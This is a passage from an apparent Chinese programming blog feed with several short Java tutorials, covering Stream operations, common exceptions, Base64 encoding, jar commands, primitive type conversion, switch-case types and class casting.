u2.getAge());System.out.println(max.get());System.out.println();System.out.println(&quot;映射-规纳－求所有人的年纪总和&quot;);list &#x3D; initList();Optional&lt;Integer&gt; reduce &#x3D; list.stream().map(User::getAge).reduce(Integer::sum);System.out.println(reduce.get());System.out.println();System.out.println(&quot;分组－按年纪分组&quot;);list &#x3D; initList();Map&lt;Integer, List&lt;User&gt;&gt; userMap &#x3D; list.stream().collect(Collectors.groupingBy(User::getAge));MapUtils.verbosePrint(System.out, null, userMap);System.out.println();System.out.println(&quot;创建－去重－统计&quot;);Stream&lt;User&gt; userStream &#x3D; Stream.of(new User(&quot;u1&quot;, 1), new User(&quot;u2&quot;, 21), new User(&quot;u2&quot;, 21));System.out.println(userStream.distinct().count());System.out.println();&#125;public static List&lt;User&gt; initList() &#123;List&lt;User&gt; list &#x3D; new ArrayList&lt;&gt;();list.add(new User(&quot;oaby&quot;, 23));list.add(new User(&quot;tom&quot;, 11));list.add(new User(&quot;john&quot;, 16));list.add(new User(&quot;jennis&quot;, 26));list.add(new User(&quot;tin&quot;, 26));list.add(new User(&quot;army&quot;, 26));list.add(new User(&quot;mack&quot;, 19));list.add(new User(&quot;jobs&quot;, 65));list.add(new User(&quot;jordan&quot;, 23));return list;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果：</p><pre class="line-numbers language-none"><code class="language-none">过滤－找出年纪大于18岁的人User [username&#x3D;oaby, age&#x3D;23]User [username&#x3D;jennis, age&#x3D;26]User [username&#x3D;tin, age&#x3D;26]User [username&#x3D;army, age&#x3D;26]User [username&#x3D;mack, age&#x3D;19]User [username&#x3D;jobs, age&#x3D;65]User [username&#x3D;jordan, age&#x3D;23]最大值－找出最大年纪的人User [username&#x3D;jobs, age&#x3D;65]映射-规纳－求所有人的年纪总和235分组－按年纪分组&#123;    16 &#x3D; [User [username&#x3D;john, age&#x3D;16]]    65 &#x3D; [User [username&#x3D;jobs, age&#x3D;65]]    19 &#x3D; [User [username&#x3D;mack, age&#x3D;19]]    23 &#x3D; [User [username&#x3D;oaby, age&#x3D;23], User [username&#x3D;jordan, age&#x3D;23]]    26 &#x3D; [User [username&#x3D;jennis, age&#x3D;26], User [username&#x3D;tin, age&#x3D;26], User [username&#x3D;army, age&#x3D;26]]    11 &#x3D; [User [username&#x3D;tom, age&#x3D;11]]&#125;创建－去重－统计2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出流操作数据集合很强大吧，但需要注意的是流只能执行一次，再次使用需要重要打开。</p><p>更多的玩法可以自己去研究吧。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10 个深恶痛绝的 Java 异常</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/10%20%E4%B8%AA%E6%B7%B1%E6%81%B6%E7%97%9B%E7%BB%9D%E7%9A%84%20Java%20%E5%BC%82%E5%B8%B8/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/10%20%E4%B8%AA%E6%B7%B1%E6%81%B6%E7%97%9B%E7%BB%9D%E7%9A%84%20Java%20%E5%BC%82%E5%B8%B8/</url>
      
        <content type="html"><![CDATA[<p>异常是 Java 程序中经常遇到的问题，我想每一个 Java 程序员都讨厌异常，一 个异常就是一个 BUG，就要花很多时间来定位异常问题。</p><blockquote><p>什么是异常及异常的分类请看这篇文章：<a href="https://mp.weixin.qq.com/s/xbopgxZ5BEDdSvwO9ad9Xg">一张图搞清楚 Java 异常机制</a>。</p></blockquote><p>今天，栈长来列一下 Java 中经常遇到的前 10 个异常，排名不分先后。</p><h2 id="1、NullPointerException"><a href="#1、NullPointerException" class="headerlink" title="1、NullPointerException"></a>1、NullPointerException</h2><p>空指针异常，操作一个 null 对象的方法或属性时会抛出这个异常。具体看这篇文章：<a href="https://mp.weixin.qq.com/s/cmkKuhEZl1qx6TXPxvA5pw">Java 避免空指针的 5 个案例</a>。</p><h2 id="2、OutOfMemoryError"><a href="#2、OutOfMemoryError" class="headerlink" title="2、OutOfMemoryError"></a>2、OutOfMemoryError</h2><p>内存异常异常，这不是程序能控制的，是指要分配的对象的内存超出了当前最大的堆内存，需要调整堆内存大小（-Xmx）以及优化程序。</p><h2 id="3、IOException"><a href="#3、IOException" class="headerlink" title="3、IOException"></a>3、IOException</h2><p>IO，即：input, output，我们在读写磁盘文件、网络内容的时候经常会生的一种异常，这种异常是受检查异常，需要进行手工捕获。</p><p>如文件读写会抛出 IOException：</p><pre class="line-numbers language-none"><code class="language-none">public int read() throws IOExceptionpublic void write(int b) throws IOException<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4、FileNotFoundException"><a href="#4、FileNotFoundException" class="headerlink" title="4、FileNotFoundException"></a>4、FileNotFoundException</h2><p>文件找不到异常，如果文件不存在就会抛出这种异常。</p><p>如定义输入输出文件流，文件不存在会报错：</p><pre class="line-numbers language-none"><code class="language-none">public FileInputStream(File file) throws FileNotFoundExceptionpublic FileOutputStream(File file) throws FileNotFoundException<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>FileNotFoundException 其实是 IOException 的子类，同样是受检查异常，需要进行手工捕获。</p><h2 id="5、ClassNotFoundException"><a href="#5、ClassNotFoundException" class="headerlink" title="5、ClassNotFoundException"></a>5、ClassNotFoundException</h2><p>类找不到异常，Java开发中经常遇到，是不是很绝望？这是在加载类的时候抛出来的，即在类路径下不能加载指定的类。</p><p>看一个示例：</p><pre class="line-numbers language-none"><code class="language-none">public static &lt;T&gt; Class&lt;T&gt; getExistingClass(ClassLoader classLoader, String className) &#123;  try &#123;     return (Class&lt;T&gt;) Class.forName(className, true, classLoader);  &#125;  catch (ClassNotFoundException e) &#123;     return null;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它是受检查异常，需要进行手工捕获。</p><h2 id="6、ClassCastException"><a href="#6、ClassCastException" class="headerlink" title="6、ClassCastException"></a>6、ClassCastException</h2><p>类转换异常，将一个不是该类的实例转换成这个类就会抛出这个异常。</p><p>如将一个数字强制转换成字符串就会报这个异常：</p><pre class="line-numbers language-none"><code class="language-none">Object x &#x3D; new Integer(0);System.out.println((String)x);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这是运行时异常，不需要手工捕获。</p><h2 id="7、NoSuchMethodException"><a href="#7、NoSuchMethodException" class="headerlink" title="7、NoSuchMethodException"></a>7、NoSuchMethodException</h2><p>没有这个方法异常，一般发生在反射调用方法的时候，如：</p><pre class="line-numbers language-none"><code class="language-none">public Method getMethod(String name, Class&lt;?&gt;... parameterTypes)    throws NoSuchMethodException, SecurityException &#123;    checkMemberAccess(Member.PUBLIC, Reflection.getCallerClass(), true);    Method method &#x3D; getMethod0(name, parameterTypes, true);    if (method &#x3D;&#x3D; null) &#123;        throw new NoSuchMethodException(getName() + &quot;.&quot; + name + argumentTypesToString(parameterTypes));    &#125;    return method;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它是受检查异常，需要进行手工捕获。</p><h2 id="8、IndexOutOfBoundsException"><a href="#8、IndexOutOfBoundsException" class="headerlink" title="8、IndexOutOfBoundsException"></a>8、IndexOutOfBoundsException</h2><p>索引越界异常，当操作一个字符串或者数组的时候经常遇到的异常。</p><p><img src="http://qianniu.javastack.cn/18-12-12/80818264.jpg"></p><p>如图所示，它是运行时异常，不需要手工捕获。</p><h2 id="9、ArithmeticException"><a href="#9、ArithmeticException" class="headerlink" title="9、ArithmeticException"></a>9、ArithmeticException</h2><p>算术异常，发生在数字的算术运算时的异常，如一个数字除以 0 就会报这个错。</p><pre class="line-numbers language-none"><code class="language-none">double n &#x3D; 3 &#x2F; 0;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个异常虽然是运行时异常，可以手工捕获抛出自定义的异常，如：</p><pre class="line-numbers language-none"><code class="language-none">public static Timestamp from(Instant instant) &#123;    try &#123;        Timestamp stamp &#x3D; new Timestamp(instant.getEpochSecond() * MILLIS_PER_SECOND);        stamp.nanos &#x3D; instant.getNano();        return stamp;    &#125; catch (ArithmeticException ex) &#123;        throw new IllegalArgumentException(ex);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="10、SQLException"><a href="#10、SQLException" class="headerlink" title="10、SQLException"></a>10、SQLException</h2><p>SQL异常，发生在操作数据库时的异常。</p><p>如下面的获取连接：</p><pre class="line-numbers language-none"><code class="language-none">public Connection getConnection() throws SQLException &#123;    if (getUser() &#x3D;&#x3D; null) &#123;        return DriverManager.getConnection(url);    &#125; else &#123;        return DriverManager.getConnection(url, getUser(), getPassword());    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>又或者是获取下一条记录的时候：</p><pre class="line-numbers language-none"><code class="language-none">boolean next() throws SQLException;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>它是受检查异常，需要进行手工捕获。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Base64 编码解码方案总结</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/Java%20Base64%20%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E6%96%B9%E6%A1%88%E6%80%BB%E7%BB%93/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/Java%20Base64%20%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E6%96%B9%E6%A1%88%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>Base64是一种能将任意Binary资料用64种字元组合成字串的方法，而这个Binary资料和字串资料彼此之间是可以互相转换的，十分方便。在实际应用上，Base64除了能将Binary资料可视化之外，也常用来表示字串加密过后的内容。如果要使用Java 程式语言来实作Base64的编码与解码功能，可以参考本篇文章的作法。</p><h4 id="早期作法"><a href="#早期作法" class="headerlink" title="早期作法"></a>早期作法</h4><p>早期在Java上做Base64的编码与解码，会使用到JDK里sun.misc套件下的BASE64Encoder和BASE64Decoder这两个类别，用法如下：</p><pre class="line-numbers language-none"><code class="language-none">final BASE64Encoder encoder &#x3D; new BASE64Encoder();final BASE64Decoder decoder &#x3D; new BASE64Decoder();final String text &#x3D; &quot;Java技术&quot;;final byte[] textByte &#x3D; text.getBytes(&quot;UTF-8&quot;);&#x2F;&#x2F;编码final String encodedText &#x3D; encoder.encode(textByte);System.out.println(encodedText);&#x2F;&#x2F;解码System.out.println(new String(decoder.decodeBuffer(encodedText), &quot;UTF-8&quot;));final BASE64Encoder encoder &#x3D; new BASE64Encoder();final BASE64Decoder decoder &#x3D; new BASE64Decoder();final String text &#x3D; &quot;Java技术&quot;;final byte[] textByte &#x3D; text.getBytes(&quot;UTF-8&quot;);&#x2F;&#x2F;编码final String encodedText &#x3D; encoder.encode(textByte);System.out.println(encodedText);&#x2F;&#x2F;解码System.out.println(new String(decoder.decodeBuffer(encodedText), &quot;UTF-8&quot;));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从以上程式可以发现，在Java用Base64一点都不难，不用几行程式码就解决了！只是这个sun.mis c套件所提供的Base64功能，编码和解码的效率并不太好，而且在以后的Java版本可能就不被支援了，完全不建议使用。</p><h4 id="Apache-Commons-Codec作法"><a href="#Apache-Commons-Codec作法" class="headerlink" title="Apache Commons Codec作法"></a>Apache Commons Codec作法</h4><p>Apache Commons Codec有提供Base64的编码与解码功能，会使用到org.apache.commons.codec.binary套件下的Base64类别，用法如下：</p><pre class="line-numbers language-none"><code class="language-none">final Base64 base64 &#x3D; new Base64();final String text &#x3D; &quot;Java技术&quot;;final byte[] textByte &#x3D; text.getBytes(&quot;UTF-8&quot;);&#x2F;&#x2F;编码final String encodedText &#x3D; base64.encodeToString(textByte);System.out.println(encodedText);&#x2F;&#x2F;解码System.out.println(new String(base64.decode(encodedText), &quot;UTF-8&quot;));final Base64 base64 &#x3D; new Base64();final String text &#x3D; &quot;Java技术&quot;;final byte[] textByte &#x3D; text.getBytes(&quot;UTF-8&quot;);&#x2F;&#x2F;编码final String encodedText &#x3D; base64.encodeToString(textByte);System.out.println(encodedText);&#x2F;&#x2F;解码System.out.println(new String(base64.decode(encodedText), &quot;UTF-8&quot;));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上的程式码看起来又比早期用sun.mis c套件还要更精简，效能实际执行起来也快了不少。缺点是需要引用Apache Commons Codec，很麻烦。</p><h4 id="Java-8之后的作法"><a href="#Java-8之后的作法" class="headerlink" title="Java 8之后的作法"></a>Java 8之后的作法</h4><p>Java 8的java.util套件中，新增了Base64的类别，可以用来处理Base64的编码与解码，用法如下：</p><pre class="line-numbers language-none"><code class="language-none">final Base64.Decoder decoder &#x3D; Base64.getDecoder();final Base64.Encoder encoder &#x3D; Base64.getEncoder();final String text &#x3D; &quot;Java技术&quot;;final byte[] textByte &#x3D; text.getBytes(&quot;UTF-8&quot;);&#x2F;&#x2F;编码final String encodedText &#x3D; encoder.encodeToString(textByte);System.out.println(encodedText);&#x2F;&#x2F;解码System.out.println(new String(decoder.decode(encodedText), &quot;UTF-8&quot;));final Base64.Decoder decoder &#x3D; Base64.getDecoder();final Base64.Encoder encoder &#x3D; Base64.getEncoder();final String text &#x3D; &quot;Java技术&quot;;final byte[] textByte &#x3D; text.getBytes(&quot;UTF-8&quot;);&#x2F;&#x2F;编码final String encodedText &#x3D; encoder.encodeToString(textByte);System.out.println(encodedText);&#x2F;&#x2F;解码System.out.println(new String(decoder.decode(encodedText), &quot;UTF-8&quot;));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与sun.mis c套件和Apache Commons Codec所提供的Base64编解码器来比较的话，Java 8提供的Base64拥有更好的效能。实际测试编码与解码速度的话，Java 8提供的Base64，要比sun.mis c套件提供的还要快至少11倍，比Apache Commons Codec提供的还要快至少3倍。<strong>因此在Java上若要使用Base64，这个Java 8底下的java .util套件所提供的Base64类别绝对是首选！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Jar包压缩、解压使用指南</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/Java%20Jar%E5%8C%85%E5%8E%8B%E7%BC%A9%E3%80%81%E8%A7%A3%E5%8E%8B%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/Java%20Jar%E5%8C%85%E5%8E%8B%E7%BC%A9%E3%80%81%E8%A7%A3%E5%8E%8B%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-2-27/79692618.jpg"></p><h4 id="什么是jar包"><a href="#什么是jar包" class="headerlink" title="什么是jar包"></a>什么是jar包</h4><p>JAR（Java Archive）是Java的归档文件，它是一种与平台无关的文件格式，它允许将许多文件组合成一个压缩文件。</p><h4 id="如何打-解包"><a href="#如何打-解包" class="headerlink" title="如何打&#x2F;解包"></a>如何打&#x2F;解包</h4><p>使用jdk&#x2F;bin&#x2F;jar.exe工具，配置完环境变量后直接使得jar命令即可。</p><h4 id="jar命令格式"><a href="#jar命令格式" class="headerlink" title="jar命令格式"></a>jar命令格式</h4><p>jar {c t x u f }[ v m e 0 M i ][-C 目录]文件名…</p><p>{ctxu}，这四个参数必须选选其一。</p><p>[v f m e 0 M i]，这几个是可选参数，文件名也是必须的。</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>-c</td><td>创建一个jar包</td></tr><tr><td>-t</td><td>显示jar中的内容列表</td></tr><tr><td>-x</td><td>解压jar包</td></tr><tr><td>-u</td><td>添加文件到jar包中</td></tr><tr><td>-f</td><td>指定jar包的文件名</td></tr><tr><td>-v</td><td>输出详细报告</td></tr><tr><td>-m</td><td>指定MANIFEST.MF文件</td></tr><tr><td>-0</td><td>生成jar包时不压缩内容</td></tr><tr><td>-M</td><td>不生成清单文件MANIFEST.MF</td></tr><tr><td>-i</td><td>为指定的jar文件创建索引文件</td></tr><tr><td>-C</td><td>可在相应的目录下执行命令</td></tr></tbody></table><p>关于MANIFEST.MF定义：</p><blockquote><p><a href="https://baike.baidu.com/item/MANIFEST.MF">https://baike.baidu.com/item/MANIFEST.MF</a></p></blockquote><h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><p><strong>往jar包添加文件</strong></p><blockquote><p>jar uf xxx.jar BOOT-INF&#x2F;classes&#x2F;application.yml</p></blockquote><p><strong>解压jar包</strong></p><blockquote><p>jar -xvf xxx.jar</p></blockquote><p><strong>打jar包，不生成清单文件，不压缩</strong></p><blockquote><p>jar -cvfM0 xxx.jar BOOT-INF&#x2F; META-INF&#x2F; org&#x2F;</p></blockquote><p>或者</p><blockquote><p>jar -cvfM0 xxx.jar *</p></blockquote><p>如果要往线上jar包添加、更新部分文件到jar包，这些命令也许对你有用。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java 中的基本数据类型转换详解</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/Java%20%E4%B8%AD%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E8%AF%A6%E8%A7%A3/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/Java%20%E4%B8%AD%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-4-3/88886519.jpg"></p><p>说基本数据类型转换之前，先了解下 Java 中的 8 种基本数据类型，以及它们的占内存的容量大小和表示的范围，如下图所示。</p><p><img src="http://img.javastack.cn/18-4-3/32808656.jpg"></p><p>之前分享过《<a href="https://mp.weixin.qq.com/s/uoNVT9IoRQmWnmy8w22UUQ">深入浅出 Java 中的包装类</a>》，现在重新温故了下原始数据类型，现在来解释下它们之间的转换关系。</p><h4 id="自动类型转换"><a href="#自动类型转换" class="headerlink" title="自动类型转换"></a>自动类型转换</h4><p>自动类型转换是指：数字表示范围小的数据类型可以自动转换成范围大的数据类型。</p><p>如：</p><pre class="line-numbers language-none"><code class="language-none">long l &#x3D; 100;int i &#x3D; 200;long ll &#x3D; i;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>具体自动转换如如下图所示。</p><p><img src="http://img.javastack.cn/18-4-3/42423859.jpg"></p><p>实线表示自动转换时不会造成数据丢失，虚线则可能会出现数据丢失问题。</p><p><strong>自动转换也要小心数据溢出问题，看下面的例子。</strong></p><pre class="line-numbers language-none"><code class="language-none">int count &#x3D; 100000000;int price &#x3D; 1999;long totalPrice &#x3D; count * price;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>编译没任何问题，但结果却输出的是负数，这是因为两个 int 相乘得到的结果是 int, 相乘的结果超出了 int 的代表范围。这种情况，一般把第一个数据转换成范围大的数据类型再和其他的数据进行运算。</p><pre class="line-numbers language-none"><code class="language-none">int count &#x3D; 100000000;int price &#x3D; 1999;long totalPrice &#x3D; (long) count * price;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>另外，向下转换时可以直接将 int 常量字面量赋值给 byte、short、char 等数据类型，而不需要强制转换，只要该常量值不超过该类型的表示范围都能自动转换。</p><h4 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h4><p>强制类型转换我们再清楚不过了，即强制显示的把一个数据类型转换为另外一种数据类型。</p><p>如：</p><pre class="line-numbers language-none"><code class="language-none">short s &#x3D; 199;int i &#x3D; s;&#x2F;&#x2F; 199double d &#x3D; 10.24;long ll &#x3D; (long) d;&#x2F;&#x2F; 10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上的转换结果都在我们的预期之内，属于正常的转换和丢失精度的情况，下面的例子就一样属于数据溢出的情况。</p><pre class="line-numbers language-none"><code class="language-none">int ii &#x3D; 300;byte b &#x3D; (byte)ii;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>300 已经超出了 byte 类型表示的范围，所以会转换成一个毫无意义的数字。</p><h4 id="类型提升"><a href="#类型提升" class="headerlink" title="类型提升"></a>类型提升</h4><p>所谓类型提升就是指在多种不同数据类型的表达式中，类型会自动向范围表示大的值的数据类型提升。</p><p>把上面的溢出的例子再改下。</p><pre class="line-numbers language-none"><code class="language-none">long count &#x3D; 100000000;int price &#x3D; 1999;long totalPrice &#x3D; price * count;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>price 为 int 型，count 为 long 型，运算结果为 long 型，运算结果正常，没有出现溢出的情况。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>switch case 支持的 6 种数据类型！</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/switch%20case%20%E6%94%AF%E6%8C%81%E7%9A%84%206%20%E7%A7%8D%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%81/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/switch%20case%20%E6%94%AF%E6%8C%81%E7%9A%84%206%20%E7%A7%8D%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><strong>Java 中 switch case 语句用来判断一个变量与一系列值中某个值是否相等，每个值称为一个分支。</strong></p><p><strong>语法格式如下：</strong></p><pre class="line-numbers language-none"><code class="language-none">switch(expression)&#123;    case value :       &#x2F;&#x2F;语句       break; &#x2F;&#x2F;可选    case value :       &#x2F;&#x2F;语句       break; &#x2F;&#x2F;可选    &#x2F;&#x2F;你可以有任意数量的case语句    default : &#x2F;&#x2F;可选       &#x2F;&#x2F;语句&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>这里的 <code>expression</code> 都支持哪些类型呢？</strong></p><ul><li><p>基本数据类型：byte, short, char, int</p></li><li><p>包装数据类型：Byte, Short, Character, Integer</p></li><li><p>枚举类型：Enum</p></li><li><p>字符串类型：String（Jdk 7+ 开始支持）</p></li></ul><p>基本数据类型和字符串很简单不用说，下面举一个使用包装类型和枚举的，其实也不难，注意只能用在 switch 块里面。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 使用包装类型Integer value &#x3D; 5;switch (value) &#123;case 3:System.out.println(&quot;3&quot;);break;case 5:System.out.println(&quot;5&quot;);break;default:System.out.println(&quot;default&quot;);&#125;&#x2F;&#x2F; 使用枚举类型Status status &#x3D; Status.PROCESSING;switch (status) &#123;case OPEN:System.out.println(&quot;open&quot;);break;case PROCESSING:System.out.println(&quot;processing&quot;);break;case CLOSE:System.out.println(&quot;close&quot;);break;default:System.out.println(&quot;default&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以下为官网的介绍文档。</p><blockquote><p><a href="https://docs.oracle.com/javase/tutorial/java/nutsandbolts/switch.html">https://docs.oracle.com/javase/tutorial/java/nutsandbolts/switch.html</a></p></blockquote><p>包装类不懂的看这篇文章《<a href="https://mp.weixin.qq.com/s/uoNVT9IoRQmWnmy8w22UUQ">深入浅出 Java 中的包装类</a>》。</p><p><strong>使用 switch case 语句也有以下几点需要注意。</strong></p><ol><li><p>case 里面必须跟 break，不然程序会一个个 case 执行下去，直到最后一个 break 的 case 或者 default 出现。</p></li><li><p>case 条件里面只能是常量或者字面常量。</p></li><li><p>default 语句可有可无，最多只能有一个。</p></li></ol><p>有问题请留言，希望本文能对你有有所帮助！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 父类强制转换子类原则</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/Java%20%E7%88%B6%E7%B1%BB%E5%BC%BA%E5%88%B6%E8%BD%AC%E6%8D%A2%E5%AD%90%E7%B1%BB%E5%8E%9F%E5%88%99/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/Java%20%E7%88%B6%E7%B1%BB%E5%BC%BA%E5%88%B6%E8%BD%AC%E6%8D%A2%E5%AD%90%E7%B1%BB%E5%8E%9F%E5%88%99/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/17-12-20/25802617.jpg" alt="image"></p><p>最近，微信群友在讨论子类父类的转换问题，其实不难，给大家用实例来说明一下就很明了了。</p><p>我们知道Java中子类转换成父类是没有任何问题的，那父类可以转换成子类吗？</p><p>来看下面这段程序：</p><pre class="line-numbers language-none"><code class="language-none">public class TestObjectConvert &#123;public static void main(String[] args) &#123;test1();test2();&#125;private static void test1() &#123;Fruit fruit1 &#x3D; new Fruit();Apple apple1 &#x3D; new Apple();apple1 &#x3D; (Apple) fruit1; &#x2F;&#x2F; java.lang.ClassCastException&#125;private static void test2() &#123;Fruit fruit1 &#x3D; new Apple();Apple apple1 &#x3D; new Apple();apple1 &#x3D; (Apple) fruit1;&#125;static class Fruit &#123;&#125;static class Apple extends Fruit &#123;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果是：</p><pre class="line-numbers language-none"><code class="language-none">test1：报类转异常；test2：转换正常。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>所以，想让父类强制转换成子类，不是没有可能，除非父类是子类构造出来的实例，不然是不能强转的。</strong></p><p>为什么呢？</p><p>如上代码，如果父类实例出来的对象是Orange，Orange当然不能强制转成Apple，所以说父类只有该子类对应的实例才能强转。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>switch多值匹配骚操作，带你涨姿势！</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/switch%E5%A4%9A%E5%80%BC%E5%8C%B9%E9%85%8D%E9%AA%9A%E6%93%8D%E4%BD%9C%EF%BC%8C%E5%B8%A6%E4%BD%A0%E6%B6%A8%E5%A7%BF%E5%8A%BF%EF%BC%81/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/switch%E5%A4%9A%E5%80%BC%E5%8C%B9%E9%85%8D%E9%AA%9A%E6%93%8D%E4%BD%9C%EF%BC%8C%E5%B8%A6%E4%BD%A0%E6%B6%A8%E5%A7%BF%E5%8A%BF%EF%BC%81/</url>
      
